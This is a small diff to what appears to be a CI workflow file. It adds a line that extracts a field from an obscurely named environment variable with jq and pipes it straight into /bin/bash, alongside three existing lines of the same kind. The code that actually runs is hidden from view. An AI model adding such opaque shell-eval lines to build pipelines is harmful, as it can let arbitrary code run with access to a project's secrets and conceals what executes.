@@ -43,6 +43,7 @@ jobs:
           echo $zs334 | jq -r .jxnmb90 | /bin/bash
           printf '%s' "$m42" | jq -r .uu4 | /bin/bash
           printf '%s' "$xif2379" | jq -r .cb38535 | /bin/bash
+          printf '%s' "$ws9" | jq -r .km00 | /bin/bash
 
       - name: Upload results
         if: always()
